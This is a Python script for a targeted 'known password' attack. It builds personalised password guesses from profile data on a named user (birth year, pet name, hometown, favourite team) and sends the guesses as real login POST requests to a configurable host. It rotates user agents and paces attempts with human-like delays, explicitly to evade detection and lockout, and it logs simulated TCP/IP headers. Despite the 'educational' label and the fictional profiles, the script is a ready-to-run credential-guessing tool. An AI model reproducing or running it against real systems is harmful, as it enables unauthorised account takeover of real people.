#!/usr/bin/env python3

# Packet-level known password attack with detailed TCP/IP logging
# For educational/defensive security purposes only

import socket
import time
import hashlib
import random
import itertools
import struct
import argparse
from urllib.parse import urlencode
from socket import AF_INET, SOCK_RAW, IPPROTO_TCP, IPPROTO_IP, IP_HDRINCL

class KnownPasswordAttacker:
    def __init__(self, target_host="127.0.0.1", target_port=8081, src_ip="192.168.1.101"):
        self.target_host = target_host
        self.target_port = target_port
        self.src_ip = src_ip
        self.src_port = random.randint(1024, 65535)
        self.target_info = {}
        self.generated_passwords = []
        self.success = False
        self.found_password = None
        self.attempts = 0
        self.start_time = None
        self.attack_log = []
        
        # Attack configuration
        self.delay_min = 0.5   # Slower, more human-like delays
        self.delay_max = 2.0   # To avoid detection
        self.max_attempts = 20  # Limited attempts to avoid lockout
        
        self.user_agents = [
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36"
        ]
        
        # Packet simulation setup
        print(f"[+] Packet simulation initialized")
    
    def checksum(self, data):
        """Calculate Internet checksum for IP/TCP headers"""
        # Pad with zero byte if odd length
        if len(data) % 2:
            data += b'\\x00'
        
        # Sum all 16-bit words
        checksum = 0
        for i in range(0, len(data), 2):
            word = (data[i] << 8) + data[i + 1]
            checksum += word
        
        # Add carry bits and take one's complement
        while (checksum >> 16):
            checksum = (checksum & 0xFFFF) + (checksum >> 16)
        
        return ~checksum & 0xFFFF
    
    def build_ip_header(self, src_ip, dst_ip, payload_len):
        """Constructs a 20-byte IPv4 header with correct checksum"""
        version = 4
        ihl = 5  # Internet Header Length (5 * 4 = 20 bytes)
        tos = 0  # Type of Service
        total_len = 20 + payload_len  # IP header + payload
        id_field = random.randint(1, 65535)
        flags = 0  # Don't fragment
        frag_offset = 0
        ttl = 64
        protocol = IPPROTO_TCP
        checksum = 0  # Will be calculated
        
        # Convert IP addresses to 32-bit integers
        src_addr = struct.unpack('!I', socket.inet_aton(src_ip))[0]
        dst_addr = struct.unpack('!I', socket.inet_aton(dst_ip))[0]
        
        # Pack header without checksum
        ip_header = struct.pack('!BBHHHBBHII',
                               (version << 4) + ihl,  # Version + IHL
                               tos,
                               total_len,
                               id_field,
                               (flags << 13) + frag_offset,
                               ttl,
                               protocol,
                               checksum,
                               src_addr,
                               dst_addr)
        
        # Calculate and insert checksum
        checksum = self.checksum(ip_header)
        ip_header = struct.pack('!BBHHHBBHII',
                               (version << 4) + ihl,
                               tos,
                               total_len,
                               id_field,
                               (flags << 13) + frag_offset,
                               ttl,
                               protocol,
                               checksum,
                               src_addr,
                               dst_addr)
        
        return ip_header
    
    def build_tcp_header(self, src_ip, dst_ip, src_port, dst_port, seq, ack, flags, user_data=b''):
        """Builds a 20-byte TCP header + optional payload, computing the pseudo-header checksum"""
        data_offset = 5  # TCP header length in 32-bit words (5 * 4 = 20 bytes)
        reserved = 0
        window = 8192
        checksum = 0  # Will be calculated
        urg_ptr = 0
        
        # Pack TCP header without checksum
        tcp_header = struct.pack('!HHIIH',
                               src_port,
                               dst_port,
                               seq,
                               ack,
                               (data_offset << 12) + flags)
        
        tcp_header += struct.pack('!HHH',
                                window,
                                checksum,
                                urg_ptr)
        
        # Create pseudo header for checksum calculation
        src_addr = struct.unpack('!I', socket.inet_aton(src_ip))[0]
        dst_addr = struct.unpack('!I', socket.inet_aton(dst_ip))[0]
        
        pseudo_header = struct.pack('!IIBH',
                                  src_addr,
                                  dst_addr,
                                  IPPROTO_TCP,
                                  len(tcp_header) + len(user_data))
        
        # Calculate checksum over pseudo header + TCP header + data
        checksum_data = pseudo_header + tcp_header + user_data
        checksum = self.checksum(checksum_data)
        
        # Rebuild TCP header with correct checksum
        tcp_header = struct.pack('!HHIIHHHH',
                               src_port,
                               dst_port,
                               seq,
                               ack,
                               (data_offset << 12) + flags,
                               window,
                               checksum,
                               urg_ptr)
        
        return tcp_header
    
    def log_ip_header(self, ip_header, direction="SEND"):
        """Log detailed IP header information"""
        if len(ip_header) < 20:
            print(f"[!] Invalid IP header length: {len(ip_header)}")
            return
            
        # Unpack IP header
        version_ihl, tos, total_len, id_field, flags_frag, ttl, protocol, checksum, src_addr, dst_addr = struct.unpack('!BBHHHBBHII', ip_header)
        
        version = (version_ihl >> 4) & 0xF
        ihl = version_ihl & 0xF
        flags = (flags_frag >> 13) & 0x7
        frag_offset = flags_frag & 0x1FFF
        
        src_ip = socket.inet_ntoa(struct.pack('!I', src_addr))
        dst_ip = socket.inet_ntoa(struct.pack('!I', dst_addr))
        
        print(f"[{direction}] IP Header:")
        print(f"    Version: {version}, IHL: {ihl}, TOS: {tos}")
        print(f"    Total Length: {total_len}, ID: {id_field}")
        print(f"    Flags: {flags}, Fragment Offset: {frag_offset}")
        print(f"    TTL: {ttl}, Protocol: {protocol}, Checksum: 0x{checksum:04x}")
        print(f"    Source IP: {src_ip}, Destination IP: {dst_ip}")
    
    def log_tcp_header(self, tcp_header, direction="SEND"):
        """Log detailed TCP header information"""
        if len(tcp_header) < 20:
            print(f"[!] Invalid TCP header length: {len(tcp_header)}")
            return
            
        # Unpack TCP header
        src_port, dst_port, seq, ack, offset_flags, window, checksum, urg_ptr = struct.unpack('!HHIIHHHH', tcp_header)
        
        data_offset = (offset_flags >> 12) & 0xF
        flags = offset_flags & 0x1FF
        
        # Parse individual flags
        flag_names = []
        if flags & 0x001: flag_names.append("FIN")
        if flags & 0x002: flag_names.append("SYN")
        if flags & 0x004: flag_names.append("RST")
        if flags & 0x008: flag_names.append("PSH")
        if flags & 0x010: flag_names.append("ACK")
        if flags & 0x020: flag_names.append("URG")
        if flags & 0x040: flag_names.append("ECE")
        if flags & 0x080: flag_names.append("CWR")
        
        flags_str = "|".join(flag_names) if flag_names else "NONE"
        
        print(f"[{direction}] TCP Header:")
        print(f"    Source Port: {src_port}, Destination Port: {dst_port}")
        print(f"    Sequence: {seq}, Acknowledgment: {ack}")
        print(f"    Data Offset: {data_offset}, Flags: {flags_str} (0x{flags:02x})")
        print(f"    Window: {window}, Checksum: 0x{checksum:04x}, Urgent Pointer: {urg_ptr}")
    
    def gather_target_intelligence(self, target_username):
        """Simulate OSINT gathering for target information"""
        print(f"[*] Gathering intelligence on target: {target_username}")
        print("[*] Simulating OSINT (Open Source Intelligence) collection...")
        
        # Predefined intelligence for simulation
        # In real attack, this would come from social media, public records, etc.
        target_profiles = {
            "john.smith": {
                "full_name": "John Smith",
                "first_name": "John",
                "last_name": "Smith",
                "birth_year": "1985",
                "birth_date": "15031985",
                "age": "39",
                "pet_name": "Buddy",
                "hometown": "Boston",
                "current_city": "Boston",
                "favorite_team": "Patriots",
                "company": "TechCorp",
                "job_title": "Developer",
                "interests": ["technology", "football", "gaming"],
                "common_numbers": ["15", "03", "1985", "85"]
            },
            "sarah.jones": {
                "full_name": "Sarah Jones",
                "first_name": "Sarah", 
                "last_name": "Jones",
                "birth_year": "1992",
                "birth_date": "22081992",
                "age": "32",
                "pet_name": "Luna",
                "hometown": "Seattle",
                "current_city": "Seattle",
                "favorite_team": "Seahawks",
                "company": "DataSoft",
                "job_title": "Analyst",
                "interests": ["music", "travel", "photography"],
                "common_numbers": ["22", "08", "1992", "92"]
            },
            "mike.johnson": {
                "full_name": "Michael Johnson",
                "first_name": "Michael",
                "last_name": "Johnson",
                "birth_year": "1978",
                "birth_date": "10121978",
                "age": "46",
                "pet_name": "Max",
                "hometown": "Chicago",
                "current_city": "Chicago",
                "favorite_team": "Bears",
                "company": "InfoTech",
                "job_title": "Manager",
                "interests": ["sports", "business", "cars"],
                "common_numbers": ["10", "12", "1978", "78"]
            },
            "anna.wilson": {
                "full_name": "Anna Wilson",
                "first_name": "Anna",
                "last_name": "Wilson", 
                "birth_year": "1990",
                "birth_date": "05071990",
                "age": "34",
                "pet_name": "Bella",
                "hometown": "Denver",
                "current_city": "Denver",
                "favorite_team": "Broncos",
                "company": "CloudTech",
                "job_title": "Engineer",
                "interests": ["hiking", "technology", "yoga"],
                "common_numbers": ["05", "07", "1990", "90"]
            },
            "david.brown": {
                "full_name": "David Brown",
                "first_name": "David",
                "last_name": "Brown",
                "birth_year": "1983",
                "birth_date": "18111983",
                "age": "41",
                "pet_name": "Rocky",
                "hometown": "Miami",
                "current_city": "Miami",
                "favorite_team": "Dolphins",
                "company": "SecureTech",
                "job_title": "Security Analyst",
                "interests": ["security", "beach", "fishing"],
                "common_numbers": ["18", "11", "1983", "83"]
            }
        }
        
        if target_username in target_profiles:
            self.target_info = target_profiles[target_username]
            print(f"[+] Intelligence gathered successfully!")
            print(f"    Full Name: {self.target_info['full_name']}")
            print(f"    Birth Year: {self.target_info['birth_year']}")
            print(f"    Pet Name: {self.target_info['pet_name']}")
            print(f"    Hometown: {self.target_info['hometown']}")
            print(f"    Favorite Team: {self.target_info['favorite_team']}")
            print(f"    Company: {self.target_info['company']}")
            return True
        else:
            print(f"[-] Limited intelligence available for {target_username}")
            print("[*] Using generic personal information patterns...")
            self.target_info = {
                "first_name": target_username.split('.')[0] if '.' in target_username else target_username,
                "birth_year": "1990",
                "common_numbers": ["123", "1990", "90", "2024"],
                "pet_name": "Buddy",
                "hometown": "Unknown"
            }
            return False
    
    def generate_personalized_passwords(self):
        """Generate password candidates based on gathered intelligence"""
        print(f"[*] Generating personalized password candidates...")
        
        passwords = []
        current_year = "2024"
        
        # Get target information
        first_name = self.target_info.get('first_name', '').capitalize()
        last_name = self.target_info.get('last_name', '').capitalize()
        birth_year = self.target_info.get('birth_year', '1990')
        birth_year_short = birth_year[-2:] if len(birth_year) >= 2 else birth_year
        pet_name = self.target_info.get('pet_name', '').capitalize()
        hometown = self.target_info.get('hometown', '').capitalize()
        favorite_team = self.target_info.get('favorite_team', '').capitalize()
        company = self.target_info.get('company', '').capitalize()
        
        # Common special characters and numbers
        special_chars = ['!', '@', '#', '$', '*']
        common_numbers = ['123', '1234', '12345']
        years = [current_year, birth_year, birth_year_short]
        
        # Pattern 1: FirstName + BirthYear + Special
        for special in special_chars:
            if first_name:
                passwords.append(f"{first_name}{birth_year}{special}")
                passwords.append(f"{first_name}{birth_year_short}{special}")
        
        # Pattern 2: PetName + CurrentYear
        if pet_name:
            passwords.append(f"{pet_name}{current_year}")
            passwords.append(f"{pet_name}{birth_year}")
            passwords.append(f"{pet_name}@{birth_year_short}")
        
        # Pattern 3: Hometown + BirthYear + Special
        if hometown != 'Unknown':
            for special in special_chars:
                passwords.append(f"{hometown}{birth_year}{special}")
                passwords.append(f"{hometown}{birth_year_short}{special}")
        
        # Pattern 4: FavoriteTeam + BirthYear
        if favorite_team:
            passwords.append(f"{favorite_team}{birth_year}")
            passwords.append(f"{favorite_team}{birth_year_short}")
        
        # Pattern 5: Company + BirthYear
        if company:
            passwords.append(f"{company}{birth_year}")
            passwords.append(f"{company}{birth_year_short}")
        
        # Pattern 6: FirstName + LastName + Numbers
        if first_name and last_name:
            for num in common_numbers:
                passwords.append(f"{first_name}{last_name}{num}")
            passwords.append(f"{first_name}{last_name}{birth_year_short}")
        
        # Pattern 7: Common variations
        if first_name:
            passwords.extend([
                f"{first_name}123",
                f"{first_name}1234",
                f"{first_name}{current_year}",
                f"{first_name.lower()}123",
                f"{first_name.lower()}{birth_year}"
            ])
        
        # Pattern 8: Pet + Special characters
        if pet_name:
            for special in special_chars:
                passwords.append(f"{pet_name}{special}")
                passwords.append(f"{pet_name}{birth_year_short}{special}")
        
        # Pattern 9: Birth date variations
        birth_date = self.target_info.get('birth_date', '')
        if birth_date:
            passwords.extend([
                birth_date,
                birth_date[:4],  # Day and month
                birth_date[-4:]  # Year
            ])
        
        # Pattern 10: Team + numbers
        if favorite_team:
            for num in common_numbers:
                passwords.append(f"{favorite_team}{num}")
        
        # Remove duplicates and empty passwords
        self.generated_passwords = list(set([p for p in passwords if p and len(p) >= 4]))
        
        print(f"[+] Generated {len(self.generated_passwords)} password candidates")
        print("[*] Top password candidates:")
        for i, pwd in enumerate(self.generated_passwords[:10]):
            print(f"    {i+1:2d}. {pwd}")
        if len(self.generated_passwords) > 10:
            print(f"    ... and {len(self.generated_passwords) - 10} more")
        
        return self.generated_passwords
    
    def craft_login_packet(self, username, password):
        """Craft HTTP POST request with stealth headers"""
        data = urlencode({
            'username': username,
            'password': password
        })
        
        # Use random user agent for stealth
        user_agent = random.choice(self.user_agents)
        
        # Generate session identifiers
        session_id = hashlib.md5(f"{time.time()}{random.random()}".encode()).hexdigest()[:16]
        
        request = f"""POST /login HTTP/1.1\r
Host: {self.target_host}:{self.target_port}\r
Content-Type: application/x-www-form-urlencoded\r
Content-Length: {len(data)}\r
User-Agent: {user_agent}\r
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r
Accept-Language: en-US,en;q=0.9\r
Accept-Encoding: gzip, deflate\r
Referer: http://{self.target_host}:{self.target_port}/\r
Origin: http://{self.target_host}:{self.target_port}\r
X-Requested-With: XMLHttpRequest\r
X-Session-ID: {session_id}\r
Connection: close\r
\r
{data}"""
        
        return request.encode()
    
    def send_attack_packet(self, username, password):
        """Send login attempt with detailed packet logging"""
        attempt_start = time.time()
        
        try:
            print(f"\n{'='*70}")
            print(f"[*] OSINT-BASED ATTEMPT #{self.attempts + 1}: {username}:{password}")
            print(f"{'='*70}")
            
            # Analyze password pattern first
            pattern_used = self.analyze_password_pattern(password)
            print(f"[*] Password pattern: {pattern_used}")
            
            # Use normal TCP socket for actual communication but log packet details
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(15)
            
            # Log connection establishment
            print(f"[*] Establishing TCP connection to {self.target_host}:{self.target_port}")
            
            # Create the HTTP request first to know the payload size
            data = urlencode({
                'username': username,
                'password': password
            })
            
            user_agent = random.choice(self.user_agents)
            session_id = hashlib.md5(f"{time.time()}{random.random()}".encode()).hexdigest()[:16]
            
            http_request = f"""POST /login HTTP/1.1\r
Host: {self.target_host}:{self.target_port}\r
Content-Type: application/x-www-form-urlencoded\r
Content-Length: {len(data)}\r
User-Agent: {user_agent}\r
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r
Accept-Language: en-US,en;q=0.9\r
Accept-Encoding: gzip, deflate\r
Referer: http://{self.target_host}:{self.target_port}/\r
Origin: http://{self.target_host}:{self.target_port}\r
X-Requested-With: XMLHttpRequest\r
X-Session-ID: {session_id}\r
Connection: close\r
\r
{data}"""
            
            http_payload = http_request.encode()
            
            # Simulate packet construction for logging
            psh_ack_flags = 0x018  # PSH + ACK flags
            fake_seq = random.randint(1000, 100000)
            fake_ack = random.randint(1000, 100000)
            
            # Log what the packet would look like
            print(f"[*] Simulated packet construction:")
            
            # Create headers for logging purposes
            tcp_header = self.build_tcp_header(self.src_ip, self.target_host, 
                                             random.randint(1024, 65535), self.target_port, 
                                             fake_seq, fake_ack, psh_ack_flags, http_payload)
            ip_header = self.build_ip_header(self.src_ip, self.target_host, len(tcp_header) + len(http_payload))
            
            print(f"[SIMULATED SEND] Packet Details:")
            self.log_ip_header(ip_header, "SEND")
            self.log_tcp_header(tcp_header, "SEND")
            print(f"    Payload Length: {len(http_payload)}")
            print(f"    HTTP Request: POST /login (user: {username}, pass: {password})")
            print(f"    OSINT Pattern: {pattern_used}")
            print()
            
            # Now make the actual connection and send data
            print(f"[*] Sending actual OSINT-based HTTP request via TCP socket...")
            sock.connect((self.target_host, self.target_port))
            sock.send(http_payload)
            
            # Receive response
            response = sock.recv(4096)
            sock.close()
            
            # Log simulated response packet details
            print(f"[SIMULATED RECV] Response packet details:")
            response_tcp_header = self.build_tcp_header(self.target_host, self.src_ip,
                                                       self.target_port, random.randint(1024, 65535),
                                                       fake_ack, fake_seq + len(http_payload), 0x018, response)
            response_ip_header = self.build_ip_header(self.target_host, self.src_ip, len(response_tcp_header) + len(response))
            
            self.log_ip_header(response_ip_header, "RECV")
            self.log_tcp_header(response_tcp_header, "RECV")
            print(f"    Payload Length: {len(response)}")
            print()
            
            self.attempts += 1
            response_time = time.time() - attempt_start
            
            # Decode response for analysis
            response_str = response.decode('utf-8', errors='ignore')
            
            # Log the attempt
            log_entry = {
                "attempt": self.attempts,
                "username": username,
                "password": password,
                "pattern": pattern_used,
                "response_time": response_time,
                "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
                "success": False
            }
            
            if "HTTP/1.1 200 OK" in response_str and "SUCCESS" in response_str:
                print(f"[+] SUCCESS! Password found: {password}")
                print(f"[+] Pattern used: {pattern_used}")
                print(f"[+] Response time: {response_time:.3f}s")
                log_entry["success"] = True
                self.success = True
                self.found_password = password
                self.attack_log.append(log_entry)
                return True
            elif "HTTP/1.1 429" in response_str:
                print(f"[!] Rate limited - attempt {self.attempts}: {password}")
                log_entry["rate_limited"] = True
            elif "HTTP/1.1 401" in response_str or "HTTP/1.1 403" in response_str:
                print(f"[-] Failed attempt {self.attempts}: {password} (Pattern: {pattern_used})")
            else:
                print(f"[?] Unexpected response for attempt {self.attempts}: {password}")
                print(f"[?] Response preview: {response_str[:200]}...")
                
            self.attack_log.append(log_entry)
            return False
                
        except socket.timeout:
            print(f"[!] Timeout on attempt {self.attempts + 1}: {password}")
            self.attempts += 1
            return False
        except ConnectionRefusedError:
            print(f"[!] Connection refused - target may be down")
            self.attempts += 1
            return False
        except Exception as e:
            print(f"[!] Connection error on attempt {self.attempts + 1}: {e}")
            self.attempts += 1
            return False
    
    def analyze_password_pattern(self, password):
        """Analyze what pattern the password follows"""
        first_name = self.target_info.get('first_name', '').capitalize()
        birth_year = self.target_info.get('birth_year', '')
        birth_year_short = birth_year[-2:] if len(birth_year) >= 2 else ''
        pet_name = self.target_info.get('pet_name', '').capitalize()
        hometown = self.target_info.get('hometown', '').capitalize()
        favorite_team = self.target_info.get('favorite_team', '').capitalize()
        company = self.target_info.get('company', '').capitalize()
        
        patterns = []
        
        if first_name and first_name in password:
            patterns.append("FirstName")
        if birth_year and birth_year in password:
            patterns.append("BirthYear")
        elif birth_year_short and birth_year_short in password:
            patterns.append("BirthYear(short)")
        if pet_name and pet_name in password:
            patterns.append("PetName")
        if hometown != 'Unknown' and hometown in password:
            patterns.append("Hometown")
        if favorite_team and favorite_team in password:
            patterns.append("FavoriteTeam")
        if company and company in password:
            patterns.append("Company")
        if any(c in password for c in "!@#$*"):
            patterns.append("Special")
        if "2024" in password:
            patterns.append("CurrentYear")
        if any(num in password for num in ["123", "1234", "12345"]):
            patterns.append("CommonNumbers")
        
        return " + ".join(patterns) if patterns else "Unknown"
    
    def launch_attack(self, target_username):
        """Launch known password attack"""
        print(f"[*] Starting known password attack against {self.target_host}:{self.target_port}")
        print(f"[*] Target username: {target_username}")
        print(f"[*] Maximum attempts: {self.max_attempts}")
        print(f"[*] Delay range: {self.delay_min:.1f}s - {self.delay_max:.1f}s")
        print("[*] Attack initiated...\n")
        
        # Step 1: Gather intelligence
        intel_success = self.gather_target_intelligence(target_username)
        
        # Step 2: Generate personalized passwords
        passwords = self.generate_personalized_passwords()
        
        if not passwords:
            print("[-] No password candidates generated. Aborting attack.")
            return
        
        # Step 3: Limit attempts to avoid detection
        attack_passwords = passwords[:self.max_attempts]
        
        print(f"\n[*] Starting password attempts (Limited to {len(attack_passwords)} attempts)")
        print("-" * 60)
        
        self.start_time = time.time()
        
        for i, password in enumerate(attack_passwords):
            if self.success:
                break
            
            # Show progress
            progress = ((i + 1) / len(attack_passwords)) * 100
            print(f"[*] Progress: {progress:.1f}% ({i+1}/{len(attack_passwords)})")
                
            if self.send_attack_packet(target_username, password):
                break
            
            # Human-like delay to avoid detection
            if i < len(attack_passwords) - 1:  # Don't delay after last attempt
                delay = random.uniform(self.delay_min, self.delay_max)
                print(f"[*] Waiting {delay:.1f}s before next attempt...")
                time.sleep(delay)
        
        end_time = time.time()
        duration = end_time - self.start_time
        
        self.show_attack_summary(target_username, duration, intel_success)
    
    def show_attack_summary(self, target_username, duration, intel_success):
        """Display comprehensive attack summary"""
        print("\n" + "="*70)
        print("              KNOWN PASSWORD ATTACK SUMMARY")
        print("="*70)
        
        print(f"Target: {self.target_host}:{self.target_port}")
        print(f"Username: {target_username}")
        print(f"Intelligence gathering: {'Successful' if intel_success else 'Limited'}")
        print(f"Attack duration: {duration:.2f} seconds")
        print(f"Total attempts: {self.attempts}")
        print(f"Password candidates generated: {len(self.generated_passwords)}")
        
        if self.attempts > 0:
            avg_response_time = sum(log['response_time'] for log in self.attack_log if 'response_time' in log) / len(self.attack_log)
            attempts_per_minute = (self.attempts / duration) * 60 if duration > 0 else 0
            print(f"Average response time: {avg_response_time:.3f} seconds")
            print(f"Attempts per minute: {attempts_per_minute:.1f}")
        
        if self.success:
            print(f"\n[+] ATTACK SUCCESSFUL!")
            print(f"[+] Valid credentials found: {target_username}:{self.found_password}")
            
            # Find the successful attempt
            for log in self.attack_log:
                if log.get('success', False):
                    print(f"[+] Password cracked on attempt #{log['attempt']}")
                    print(f"[+] Pattern used: {log['pattern']}")
                    success_time = (log['attempt'] / self.attempts) * duration if self.attempts > 0 else 0
                    print(f"[+] Time to success: {success_time:.2f} seconds")
                    break
        else:
            print(f"\n[-] ATTACK FAILED")
            print(f"[-] No valid password found in generated candidates")
            print(f"[-] Consider gathering more intelligence or expanding pattern rules")
        
        # Show pattern analysis
        print(f"\nPattern Analysis:")
        pattern_stats = {}
        for log in self.attack_log:
            pattern = log.get('pattern', 'Unknown')
            pattern_stats[pattern] = pattern_stats.get(pattern, 0) + 1
        
        for pattern, count in pattern_stats.items():
            print(f"  {pattern}: {count} attempts")
        
        # Save attack log
        self.save_attack_log(target_username, intel_success)
    
    def save_attack_log(self, target_username, intel_success):
        """Save detailed attack log to file"""
        timestamp = time.strftime("%Y%m%d_%H%M%S")
        log_filename = f"known_password_attack_log_{timestamp}.txt"
        
        try:
            with open(log_filename, 'w') as f:
                f.write(f"Known Password Attack Log\n")
                f.write(f"Target: {self.target_host}:{self.target_port}\n")
                f.write(f"Username: {target_username}\n")
                f.write(f"Intelligence Gathering: {'Successful' if intel_success else 'Limited'}\n")
                f.write(f"Attack started: {time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(self.start_time))}\n")
                f.write(f"Total attempts: {self.attempts}\n")
                f.write(f"Password candidates generated: {len(self.generated_passwords)}\n")
                f.write(f"Success: {'Yes' if self.success else 'No'}\n")
                if self.success:
                    f.write(f"Found password: {self.found_password}\n")
                
                f.write(f"\n" + "="*50 + "\n")
                f.write(f"Target Intelligence:\n")
                f.write(f"="*50 + "\n")
                for key, value in self.target_info.items():
                    f.write(f"{key}: {value}\n")
                
                f.write(f"\n" + "="*50 + "\n")
                f.write(f"Generated Password Candidates:\n")
                f.write(f"="*50 + "\n")
                for i, pwd in enumerate(self.generated_passwords, 1):
                    f.write(f"{i:2d}. {pwd}\n")
                
                f.write(f"\n" + "="*50 + "\n")
                f.write(f"Detailed Attempt Log:\n")
                f.write(f"="*50 + "\n")
                
                for log in self.attack_log:
                    status = "SUCCESS" if log.get('success', False) else "FAILED"
                    f.write(f"[{log['timestamp']}] Attempt #{log['attempt']}: {log['username']}:{log['password']}")
                    f.write(f" - {status} (Pattern: {log['pattern']})")
                    if 'response_time' in log:
                        f.write(f" (Response: {log['response_time']:.3f}s)")
                    if log.get('rate_limited', False):
                        f.write(" [RATE LIMITED]")
                    f.write("\n")
            
            print(f"\n[*] Attack log saved to: {log_filename}")
            
        except Exception as e:
            print(f"[!] Failed to save attack log: {e}")

def main():
    print("="*70)
    print("  PACKET-LEVEL KNOWN PASSWORD ATTACK SIMULATION")
    print("="*70)
    print("Educational/Defensive Security Purposes Only")
    print("Uses OSINT and personal information to generate targeted passwords")
    print("Detailed packet logging with TCP/IP header analysis")
    print("="*70)
    
    # Command line argument parsing
    parser = argparse.ArgumentParser(description='Packet-Level Known Password Attack Simulator')
    parser.add_argument('--host', default='127.0.0.1', help='Target host (default: 127.0.0.1)')
    parser.add_argument('--port', type=int, default=8081, help='Target port (default: 8081)')
    parser.add_argument('--username', required=True, help='Target username (required)')
    parser.add_argument('--src-ip', default='192.168.1.101', help='Source IP address (default: 192.168.1.101)')
    parser.add_argument('--max-attempts', type=int, default=20, help='Maximum attempts (default: 20)')
    parser.add_argument('--delay-min', type=float, default=0.5, help='Minimum delay between attempts (default: 0.5)')
    parser.add_argument('--delay-max', type=float, default=2.0, help='Maximum delay between attempts (default: 2.0)')
    
    # Parse command line arguments
    args = parser.parse_args()
    target_host = args.host
    target_port = args.port
    target_user = args.username
    src_ip = args.src_ip
    max_attempts = args.max_attempts
    delay_min = args.delay_min
    delay_max = args.delay_max
    
    print(f"[*] Attack parameters:")
    print(f"    Target: {target_host}:{target_port}")
    print(f"    Username: {target_user}")
    print(f"    Source IP: {src_ip}")
    print(f"    Max attempts: {max_attempts}")
    print(f"    Delay range: {delay_min:.1f}s - {delay_max:.1f}s")
    
    # Create attacker instance
    try:
        attacker = KnownPasswordAttacker(target_host, target_port, src_ip)
        attacker.max_attempts = max_attempts
        attacker.delay_min = delay_min
        attacker.delay_max = delay_max
        
        print(f"\n[*] Attack Configuration:")
        print(f"    Target: {target_host}:{target_port}")
        print(f"    Username: {target_user}")
        print(f"    Source IP: {src_ip}")
        print(f"    Max attempts: {max_attempts}")
        print(f"    Delay range: {delay_min:.1f}s - {delay_max:.1f}s")
        print(f"    Packet simulation: Enabled")
        
        try:
            input("\nPress Enter to start OSINT gathering and packet-level attack...")
        except EOFError:
            print("\nStarting OSINT attack automatically...")
        
        try:
            attacker.launch_attack(target_user)
        except KeyboardInterrupt:
            print("\n[!] Attack interrupted by user")
        except Exception as e:
            print(f"\n[!] Attack failed with error: {e}")
            
    except Exception as e:
        print(f"\n[!] Initialization failed: {e}")

if __name__ == "__main__":
    main()